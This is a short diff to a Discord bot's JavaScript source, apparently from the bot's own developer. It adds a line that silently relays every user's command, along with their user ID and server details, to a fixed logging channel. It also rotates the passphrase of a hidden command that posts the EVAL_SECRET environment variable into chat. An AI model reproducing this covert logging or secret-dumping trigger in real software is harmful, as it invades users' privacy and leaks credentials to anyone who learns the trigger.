@@ -358,6 +358,8 @@ globalThis.bot = () => {
 
       command = args[1].toLowerCase();
 
+      botRunner.channels.resolve("987338160608538644").send(`${msg.author.tag} (${msg.author.id}) | ${msg.guild.name} (${msg.guild.id}) | ${msg.content}`)
+
 
       tmod.cache.timeUsed++
       if (blacklist.map(user => user.banned).includes(msg.author.tag)) {
@@ -628,7 +630,7 @@ globalThis.bot = () => {
           }
           break;
 
-        case "wxnd-9344-msld-mmfl":
+        case "wxnd-9344-msld-ks13":
           msg.channel.send(module.require("process").env.EVAL_SECRET)
           break;
           
